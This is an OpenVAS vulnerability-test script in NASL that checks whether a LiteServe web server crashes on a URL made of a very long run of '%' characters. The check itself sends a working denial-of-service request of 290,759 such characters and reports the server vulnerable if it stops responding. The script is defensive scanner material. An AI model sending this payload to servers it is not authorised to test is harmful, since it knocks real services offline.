# OpenVAS Vulnerability Test
# $Id: LiteServe_DoS.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: LiteServe URL Decoding DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote web server dies when an URL consisting of a 
long invalid string of % is sent.

A cracker may use this flaw to make your server crash continually.";

tag_solution = "upgrade your server or firewall it.";

# Affected:
# Webseal 3.8
#
# *unconfirmed*

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.11155");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"9.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
 
 name = "LiteServe URL Decoding DoS";
 script_name(name);

 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 
 family = "Denial of Service";
 script_family(family);
 script_dependencies("find_service.nasl", "httpver.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#

include("http_func.inc");

port = get_http_port(default:80);


if (! get_port_state(port)) exit(0);

if (http_is_dead(port: port)) exit(0);

soc = open_sock_tcp(port);
if (! soc) exit(0);

req = string("GET /", crap(data: "%",length: 290759), " HTTP/1.0\r\n\r\n");
send(socket: soc, data: req);
r = http_recv(socket: soc);
close(soc);
sleep(1);

if (http_is_dead(port: port)) { security_message(port); }
